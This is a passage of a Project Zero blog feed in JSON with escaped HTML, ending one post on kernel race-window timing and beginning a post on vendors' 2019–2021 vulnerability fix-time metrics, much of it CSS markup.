600px;\"title=\"A histogram of interrupt instruction pointers, showing that almost all interrupts were delivered with RIP pointing to the instruction after the high-latency load.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;This means that &lt;/span&gt;&lt;span class=\"c6\"&gt;if&lt;/span&gt;&lt;span&gt;&amp;nbsp;the first access to the file terminated our race window (which is not the case), we probably wouldn&amp;#39;t be able to win the race by making the access to the file slow - instead we&amp;#39;d have to slow down one of the operations before that. (But note that I have only tested simple loads, not stores or read-modify-write operations here.)&lt;/span&gt;&lt;/p&gt;"},"link":[{"@rel":"replies","@type":"application/atom+xml","@href":"https://googleprojectzero.blogspot.com/feeds/2892029424446991022/comments/default","@title":"Post Comments"},{"@rel":"replies","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/03/racing-against-clock-hitting-tiny.html#comment-form","@title":"0 Comments"},{"@rel":"edit","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/2892029424446991022"},{"@rel":"self","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/2892029424446991022"},{"@rel":"alternate","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/03/racing-against-clock-hitting-tiny.html","@title":"Racing against the clock -- hitting a tiny kernel race window"}],"author":{"name":"Ryan","uri":"http://www.blogger.com/profile/17011901605865574886","email":"noreply@blogger.com","gd:image":{"@rel":"http://schemas.google.com/g/2005#thumbnail","@width":"16","@height":"16","@src":"https://img1.blogblog.com/img/b16-rounded.gif"}},"media:thumbnail":{"@xmlns:media":"http://search.yahoo.com/mrss/","@url":"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKajtxfGAZhXanWS7kcvJozqQU2jozVQGIZdgex6_IRhp9jWHiJiL2KQddxH7Ma02d5sqhnXROh1PacqksZu3sA7-zjwh3ES8E8fQ7Jza8lu2claui1T9xYN3wrgv4J9yMFxbrUIAGiouvy4GGq-J69qROIjIITzvNpMQtJpljanHvTgd4xgrhZfRt/s72-c/image19.png","@height":"72","@width":"72"},"thr:total":"0"},{"id":"tag:blogger.com,1999:blog-4838136820032157985.post-3889819885234441482","published":"2022-02-10T08:58:00.001-08:00","updated":"2022-08-23T11:50:56.709-07:00","title":{"@type":"text","#text":"A walk through Project Zero metrics"},"content":{"@type":"html","#text":"&lt;style type=\"text/css\"&gt;ol.lst-kix_p008n8rtcs1c-3.start{counter-reset:lst-ctn-kix_p008n8rtcs1c-3 0}.lst-kix_sr4t049r1bof-6&gt;li{counter-increment:lst-ctn-kix_sr4t049r1bof-6}.lst-kix_ygk8qly5wagc-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_p008n8rtcs1c-6&gt;li{counter-increment:lst-ctn-kix_p008n8rtcs1c-6}.lst-kix_ygk8qly5wagc-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_p008n8rtcs1c-7&gt;li{counter-increment:lst-ctn-kix_p008n8rtcs1c-7}ol.lst-kix_p008n8rtcs1c-0.start{counter-reset:lst-ctn-kix_p008n8rtcs1c-0 0}.lst-kix_ygk8qly5wagc-8&gt;li:before{content:\"\\0025a0  \"}ol.lst-kix_sr4t049r1bof-1.start{counter-reset:lst-ctn-kix_sr4t049r1bof-1 0}.lst-kix_sr4t049r1bof-5&gt;li{counter-increment:lst-ctn-kix_sr4t049r1bof-5}.lst-kix_7tz9dwqwiu1-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_7tz9dwqwiu1-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_7tz9dwqwiu1-2&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_ygk8qly5wagc-6{list-style-type:none}.lst-kix_sr4t049r1bof-7&gt;li{counter-increment:lst-ctn-kix_sr4t049r1bof-7}ul.lst-kix_ygk8qly5wagc-5{list-style-type:none}.lst-kix_7tz9dwqwiu1-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_7tz9dwqwiu1-3&gt;li:before{content:\"\\0025cf  \"}ul.lst-kix_ygk8qly5wagc-8{list-style-type:none}ul.lst-kix_ygk8qly5wagc-7{list-style-type:none}ol.lst-kix_p008n8rtcs1c-6.start{counter-reset:lst-ctn-kix_p008n8rtcs1c-6 0}ul.lst-kix_ygk8qly5wagc-2{list-style-type:none}ul.lst-kix_ygk8qly5wagc-1{list-style-type:none}ol.lst-kix_sr4t049r1bof-4.start{counter-reset:lst-ctn-kix_sr4t049r1bof-4 0}ul.lst-kix_ygk8qly5wagc-4{list-style-type:none}ul.lst-kix_ygk8qly5wagc-3{list-style-type:none}ul.lst-kix_ygk8qly5wagc-0{list-style-type:none}.lst-kix_p008n8rtcs1c-8&gt;li{counter-increment:lst-ctn-kix_p008n8rtcs1c-8}.lst-kix_7tz9dwqwiu1-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_p008n8rtcs1c-5&gt;li{counter-increment:lst-ctn-kix_p008n8rtcs1c-5}.lst-kix_sr4t049r1bof-0&gt;li:before{content:\"\" counter(lst-ctn-kix_sr4t049r1bof-0,decimal) \") \"}.lst-kix_rpco0oapapnv-8&gt;li:before{content:\"\\0025a0  \"}.lst-kix_rpco0oapapnv-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_sr4t049r1bof-3&gt;li:before{content:\"(\" counter(lst-ctn-kix_sr4t049r1bof-3,decimal) \") \"}.lst-kix_sr4t049r1bof-2&gt;li:before{content:\"\" counter(lst-ctn-kix_sr4t049r1bof-2,lower-roman) \") \"}.lst-kix_sr4t049r1bof-1&gt;li:before{content:\"\" counter(lst-ctn-kix_sr4t049r1bof-1,lower-latin) \") \"}ol.lst-kix_sr4t049r1bof-7.start{counter-reset:lst-ctn-kix_sr4t049r1bof-7 0}.lst-kix_7tz9dwqwiu1-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_p008n8rtcs1c-3&gt;li{counter-increment:lst-ctn-kix_p008n8rtcs1c-3}.lst-kix_7tz9dwqwiu1-7&gt;li:before{content:\"\\0025cb  \"}ol.lst-kix_sr4t049r1bof-0.start{counter-reset:lst-ctn-kix_sr4t049r1bof-0 0}.lst-kix_7tz9dwqwiu1-8&gt;li:before{content:\"\\0025a0  \"}ol.lst-kix_p008n8rtcs1c-5.start{counter-reset:lst-ctn-kix_p008n8rtcs1c-5 0}ol.lst-kix_sr4t049r1bof-2{list-style-type:none}ol.lst-kix_sr4t049r1bof-1{list-style-type:none}ol.lst-kix_sr4t049r1bof-0{list-style-type:none}ol.lst-kix_sr4t049r1bof-6.start{counter-reset:lst-ctn-kix_sr4t049r1bof-6 0}ol.lst-kix_p008n8rtcs1c-4.start{counter-reset:lst-ctn-kix_p008n8rtcs1c-4 0}.lst-kix_sr4t049r1bof-7&gt;li:before{content:\"\" counter(lst-ctn-kix_sr4t049r1bof-7,lower-latin) \". \"}.lst-kix_sr4t049r1bof-6&gt;li:before{content:\"\" counter(lst-ctn-kix_sr4t049r1bof-6,decimal) \". \"}.lst-kix_sr4t049r1bof-8&gt;li:before{content:\"\" counter(lst-ctn-kix_sr4t049r1bof-8,lower-roman) \". \"}.lst-kix_sr4t049r1bof-0&gt;li{counter-increment:lst-ctn-kix_sr4t049r1bof-0}.lst-kix_sr4t049r1bof-3&gt;li{counter-increment:lst-ctn-kix_sr4t049r1bof-3}.lst-kix_sr4t049r1bof-4&gt;li:before{content:\"(\" counter(lst-ctn-kix_sr4t049r1bof-4,lower-latin) \") \"}.lst-kix_sr4t049r1bof-5&gt;li:before{content:\"(\" counter(lst-ctn-kix_sr4t049r1bof-5,lower-roman) \") \"}.lst-kix_p008n8rtcs1c-8&gt;li:before{content:\"\" counter(lst-ctn-kix_p008n8rtcs1c-8,lower-roman) \". \"}ol.lst-kix_sr4t049r1bof-2.start{counter-reset:lst-ctn-kix_sr4t049r1bof-2 0}.lst-kix_p008n8rtcs1c-7&gt;li:before{content:\"\" counter(lst-ctn-kix_p008n8rtcs1c-7,lower-latin) \". \"}.lst-kix_p008n8rtcs1c-4&gt;li:before{content:\"(\" counter(lst-ctn-kix_p008n8rtcs1c-4,lower-latin) \") \"}.lst-kix_p008n8rtcs1c-6&gt;li:before{content:\"\" counter(lst-ctn-kix_p008n8rtcs1c-6,decimal) \". \"}.lst-kix_p008n8rtcs1c-1&gt;li{counter-increment:lst-ctn-kix_p008n8rtcs1c-1}.lst-kix_p008n8rtcs1c-5&gt;li:before{content:\"(\" counter(lst-ctn-kix_p008n8rtcs1c-5,lower-roman) \") \"}ul.lst-kix_9x4uh3knfz5m-2{list-style-type:none}ul.lst-kix_9x4uh3knfz5m-1{list-style-type:none}ul.lst-kix_9x4uh3knfz5m-0{list-style-type:none}ul.lst-kix_9x4uh3knfz5m-6{list-style-type:none}ul.lst-kix_9x4uh3knfz5m-5{list-style-type:none}.lst-kix_sr4t049r1bof-1&gt;li{counter-increment:lst-ctn-kix_sr4t049r1bof-1}ul.lst-kix_9x4uh3knfz5m-4{list-style-type:none}ul.lst-kix_9x4uh3knfz5m-3{list-style-type:none}ol.lst-kix_sr4t049r1bof-6{list-style-type:none}ol.lst-kix_sr4t049r1bof-5{list-style-type:none}.lst-kix_p008n8rtcs1c-0&gt;li{counter-increment:lst-ctn-kix_p008n8rtcs1c-0}ol.lst-kix_sr4t049r1bof-4{list-style-type:none}ol.lst-kix_sr4t049r1bof-3{list-style-type:none}ol.lst-kix_sr4t049r1bof-8{list-style-type:none}ol.lst-kix_sr4t049r1bof-5.start{counter-reset:lst-ctn-kix_sr4t049r1bof-5 0}ol.lst-kix_sr4t049r1bof-7{list-style-type:none}.lst-kix_p008n8rtcs1c-2&gt;li{counter-increment:lst-ctn-kix_p008n8rtcs1c-2}.lst-kix_sr4t049r1bof-2&gt;li{counter-increment:lst-ctn-kix_sr4t049r1bof-2}ol.lst-kix_p008n8rtcs1c-2.start{counter-reset:lst-ctn-kix_p008n8rtcs1c-2 0}ol.lst-kix_sr4t049r1bof-8.start{counter-reset:lst-ctn-kix_sr4t049r1bof-8 0}ul.lst-kix_9x4uh3knfz5m-8{list-style-type:none}ul.lst-kix_9x4uh3knfz5m-7{list-style-type:none}.lst-kix_rpco0oapapnv-1&gt;li:before{content:\"\\0025cb  \"}ul.lst-kix_7tz9dwqwiu1-5{list-style-type:none}ul.lst-kix_7tz9dwqwiu1-6{list-style-type:none}ul.lst-kix_7tz9dwqwiu1-7{list-style-type:none}ul.lst-kix_7tz9dwqwiu1-8{list-style-type:none}.lst-kix_rpco0oapapnv-2&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_7tz9dwqwiu1-1{list-style-type:none}ul.lst-kix_7tz9dwqwiu1-2{list-style-type:none}ul.lst-kix_7tz9dwqwiu1-3{list-style-type:none}ul.lst-kix_7tz9dwqwiu1-4{list-style-type:none}.lst-kix_rpco0oapapnv-3&gt;li:before{content:\"\\0025cf  \"}ul.lst-kix_7tz9dwqwiu1-0{list-style-type:none}.lst-kix_rpco0oapapnv-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_rpco0oapapnv-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_rpco0oapapnv-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_9x4uh3knfz5m-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_9x4uh3knfz5m-8&gt;li:before{content:\"\\0025a0  \"}.lst-kix_9x4uh3knfz5m-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_9x4uh3knfz5m-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_9x4uh3knfz5m-4&gt;li:before{content:\"\\0025cb  \"}ol.lst-kix_p008n8rtcs1c-8.start{counter-reset:lst-ctn-kix_p008n8rtcs1c-8 0}.lst-kix_9x4uh3knfz5m-2&gt;li:before{content:\"\\0025a0  \"}.lst-kix_sr4t049r1bof-4&gt;li{counter-increment:lst-ctn-kix_sr4t049r1bof-4}.lst-kix_p008n8rtcs1c-4&gt;li{counter-increment:lst-ctn-kix_p008n8rtcs1c-4}.lst-kix_rpco0oapapnv-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_sr4t049r1bof-8&gt;li{counter-increment:lst-ctn-kix_sr4t049r1bof-8}.lst-kix_9x4uh3knfz5m-6&gt;li:before{content:\"\\0025cf  \"}ul.lst-kix_rpco0oapapnv-6{list-style-type:none}ul.lst-kix_rpco0oapapnv-7{list-style-type:none}ul.lst-kix_rpco0oapapnv-8{list-style-type:none}ul.lst-kix_rpco0oapapnv-2{list-style-type:none}ul.lst-kix_rpco0oapapnv-3{list-style-type:none}ol.lst-kix_p008n8rtcs1c-0{list-style-type:none}ul.lst-kix_rpco0oapapnv-4{list-style-type:none}ul.lst-kix_rpco0oapapnv-5{list-style-type:none}ol.lst-kix_sr4t049r1bof-3.start{counter-reset:lst-ctn-kix_sr4t049r1bof-3 0}ol.lst-kix_p008n8rtcs1c-7.start{counter-reset:lst-ctn-kix_p008n8rtcs1c-7 0}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_ygk8qly5wagc-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_9x4uh3knfz5m-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_ygk8qly5wagc-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_ygk8qly5wagc-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_p008n8rtcs1c-0&gt;li:before{content:\"\" counter(lst-ctn-kix_p008n8rtcs1c-0,decimal) \") \"}.lst-kix_p008n8rtcs1c-2&gt;li:before{content:\"\" counter(lst-ctn-kix_p008n8rtcs1c-2,lower-roman) \") \"}.lst-kix_9x4uh3knfz5m-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_p008n8rtcs1c-3&gt;li:before{content:\"(\" counter(lst-ctn-kix_p008n8rtcs1c-3,decimal) \") \"}.lst-kix_ygk8qly5wagc-0&gt;li:before{content:\"\\0025cf  \"}ol.lst-kix_p008n8rtcs1c-2{list-style-type:none}ol.lst-kix_p008n8rtcs1c-1{list-style-type:none}.lst-kix_ygk8qly5wagc-1&gt;li:before{content:\"\\0025cb  \"}ol.lst-kix_p008n8rtcs1c-4{list-style-type:none}ul.lst-kix_rpco0oapapnv-0{list-style-type:none}ol.lst-kix_p008n8rtcs1c-3{list-style-type:none}ul.lst-kix_rpco0oapapnv-1{list-style-type:none}.lst-kix_ygk8qly5wagc-2&gt;li:before{content:\"\\0025a0  \"}ol.lst-kix_p008n8rtcs1c-6{list-style-type:none}ol.lst-kix_p008n8rtcs1c-5{list-style-type:none}ol.lst-kix_p008n8rtcs1c-8{list-style-type:none}.lst-kix_p008n8rtcs1c-1&gt;li:before{content:\"\" counter(lst-ctn-kix_p008n8rtcs1c-1,lower-latin) \") \"}ol.lst-kix_p008n8rtcs1c-1.start{counter-reset:lst-ctn-kix_p008n8rtcs1c-1 0}ol.lst-kix_p008n8rtcs1c-7{list-style-type:none}ol{margin:0;padding:0}table td,table th{padding:0}.c6{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:112.5pt;border-top-color:#cccccc;border-bottom-style:solid}.c3{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:60pt;border-top-color:#cccccc;border-bottom-style:solid}.c32{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:33pt;border-top-color:#cccccc;border-bottom-style:solid}.c28{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:93.8pt;border-top-color:#cccccc;border-bottom-style:solid}.c21{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:115.5pt;border-top-color:#cccccc;border-bottom-style:solid}.c12{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:90.8pt;border-top-color:#cccccc;border-bottom-style:solid}.c16{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:74.2pt;border-top-color:#cccccc;border-bottom-style:solid}.c14{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:96.8pt;border-top-color:#cccccc;border-bottom-style:solid}.c10{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:57.8pt;border-top-color:#cccccc;border-bottom-style:solid}.c23{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:49.5pt;border-top-color:#cccccc;border-bottom-style:solid}.c15{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:75pt;border-top-color:#cccccc;border-bottom-style:solid}.c5{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:top;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:93pt;border-top-color:#cccccc;border-bottom-style:solid}.c25{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:top;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:96pt;border-top-color:#cccccc;border-bottom-style:solid}.c19{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:73.5pt;border-top-color:#cccccc;border-bottom-style:solid}.c22{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:9pt;font-family:\"Arial\";font-style:italic}.c2{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:10pt}.c11{padding-top:16pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c33{color:#434343;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:13pt;font-family:\"Arial\";font-style:normal}.c31{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:15pt;font-family:\"Arial\";font-style:normal}.c4{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:\"Arial\";font-style:normal}.c29{padding-top:20pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c27{padding-top:0pt;padding-bottom:0pt;line-height:1.0;orphans:2;widows:2;text-align:left}.c0{padding-top:0pt;padding-bottom:0pt;line-height:1.0;orphans:2;widows:2;text-align:right}.c26{color:#000000;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:\"Arial\";font-style:normal}.c42{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:\"Arial\"}.c8{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c9{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.c13{border-spacing:0;border-collapse:collapse;margin-right:auto}.c17{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c1{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:right}.c34{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c30{margin-left:36pt;padding-left:0pt}.c41{padding:0;margin:0}.c20{color:inherit;text-decoration:inherit}.c39{font-size:9pt}.c24{height:0pt}.c18{height:15.8pt}.c35{height:10pt}.c36{height:28.5pt}.c40{height:17.2pt}.c37{font-style:italic}.c7{font-weight:700}.c38{height:39.8pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:10pt;font-family:\"Arial\"}p{margin:0;color:#000000;font-size:10pt;font-family:\"Arial\"}h1{padding-top:20pt;color:#000000;font-size:15pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:13pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class=\"c34\"&gt;\n &lt;p class=\"c8\"&gt;&lt;span class=\"c4\"&gt;Posted by Ryan Schoen, Project Zero&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"c29\" id=\"h.xo66zodpzj4v\"&gt;&lt;span class=\"c31\"&gt;tl;dr&lt;/span&gt;&lt;/h1&gt;&lt;ul style=\"padding: 0;\" class=\"c41 lst-kix_rpco0oapapnv-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c8 c30 li-bullet-0\"&gt;&lt;span class=\"c4\"&gt;In 2021, vendors took an average of 52 days to fix security vulnerabilities reported from Project Zero. This is a significant acceleration from an average of about 80 days 3 years ago.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c8 c30 li-bullet-0\"&gt;&lt;span&gt;In addition to the average now being well below the &lt;/span&gt;&lt;span class=\"c17\"&gt;&lt;a class=\"c201\" href=\"https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html\"&gt;90-day deadline&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, we have also seen a dropoff in vendors missing the deadline (or the additional &lt;/span&gt;&lt;span class=\"c17\"&gt;&lt;a class=\"c201\" href=\"https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html#deadlinemiss\"&gt;14-day grace period&lt;/a&gt;&lt;/span&gt;&lt;span&gt;). &lt;/span&gt;&lt;span&gt;In 2021, only one bug exceeded its fix deadline, though 14% of bugs required the grace period.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c8 c30 li-bullet-0\"&gt;&lt;span class=\"c4\"&gt;Differences in the amount of time it takes a vendor/product to ship a fix to users reflects their product design, development practices, update cadence, and general processes towards security reports. We hope that this comparison can showcase best practices, and encourage vendors to experiment with new policies.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c8 c30 li-bullet-0\"&gt;&lt;span&gt;This &lt;/span&gt;&lt;span&gt;data&lt;/span&gt;&lt;span class=\"c4\"&gt;&amp;nbsp;aggregation and analysis is relatively new for Project Zero, but we hope to do it more in the future. We encourage all vendors to consider publishing aggregate data on their time-to-fix and time-to-patch for externally reported vulnerabilities, as well as more data sharing and transparency in general.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c4\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"c29\" id=\"h.pta8ps9u6b3h\"&gt;&lt;span class=\"c31\"&gt;Overview&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"c8\"&gt;&lt;span&gt;For nearly ten years, Google&amp;rsquo;s Project Zero has been working to &lt;/span&gt;&lt;span&gt;make it more difficult for bad actors to find and &lt;/span&gt;&lt;span class=\"c4\"&gt;exploit security vulnerabilities, significantly improving the security of the Internet for everyone. In that time, we have partnered with folks across industry to transform the way organizations prioritize and approach fixing security vulnerabilities and updating people&amp;rsquo;s software.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c4\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c8\"&gt;&lt;span&gt;To help contextualize the shifts we are seeing the ecosystem make, we &lt;/span&gt;&lt;span&gt;looked back at the set of vulnerabilities Project Zero has been reporting, how a range of vendors have been responding to them, and then attempted to identify trends in this &lt;/span&gt;&lt;span&gt;data&lt;/span&gt;&lt;span&gt;, such as how the industry as a whole is patching vulnerabilities faster.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c4\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c8\"&gt;&lt;span&gt;For this post, we look at fixed bugs that were reported between January 2019 and December 2021 &lt;/span&gt;&lt;span class=\"c37\"&gt;(2019 is the year we made changes to our disclosure policies and also began recording more detailed metrics on our reported bugs).&lt;/span&gt;&lt;span&gt;&amp;nbsp;The data we&amp;#39;ll be referencing is publicly available on the &lt;/span&gt;&lt;span class=\"c17\"&gt;&lt;a class=\"c201\" href=\"https://bugs.chromium.org/p/project-zero/issues/list\"&gt;Project Zero Bug Tracker&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c4\"&gt;, and on various open source project repositories (in the case of the data used below to track the timeline of open-source browser bugs). &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c4\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c8\"&gt;&lt;span class=\"c4\"&gt;There are a number of caveats with our data, the largest being that we&amp;#39;ll be looking at a small number of samples, so differences in numbers may or may not be statistically significant. Also, the direction of Project Zero&amp;#39;s research is almost entirely influenced by the choices of individual researchers, so changes in our research targets could shift metrics as much as changes in vendor behaviors could. As much as possible, this post is designed to be an objective presentation of the data, with additional subjective analysis included at the end.&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"c29\" id=\"h.1d9pvkaiez8g\"&gt;&lt;span class=\"c31\"&gt;The data!&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"c8\"&gt;&lt;span&gt;Between 2019 and 2021, Project Zero reported &lt;/span&gt;&lt;span class=\"c17\"&gt;&lt;a class=\"c201\" href=\"https://bugs.chromium.org/p/project-zero/issues/list?sort=id&amp;colspec=ID%20Status%20Restrict%20Finder%20Reported%20Deadline%20Remaining%20CVE%20Vendor%20Product%20Summary&amp;q=status%21%3DInvalid%20id%3E%3D1748%20id%3C%3D2248%20Deadline%3A90&amp;can=1\"&gt;376 issues&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to vendors under our standard 90-day deadline. 351 (93.4%) of these bugs have been fixed, while 14 (3.7%) have been marked &lt;/span&gt;&lt;span&gt;as WontFix by the vendor&lt;/span&gt;&lt;span&gt;s. &lt;/span&gt;&lt;span&gt;11 (2.9%) other bugs remain unfixed, though at the time of this writing 8 have passed their deadline to be fixed; the remaining 3 are still within their deadline to be fixed.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Most of the vulnerabilities are clustered around a few vendors, with 96 bugs (26%) being reported to &lt;/span&gt;&lt;span&gt;Microsoft, 85 (23%) to Apple, and 60 (16%) to Google. &lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"c29\" id=\"h.sv8ualubd8u5\"&gt;&lt;span class=\"c31\"&gt;Deadline adherence&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"c8\"&gt;&lt;span&gt;Once a vendor receives a bug report 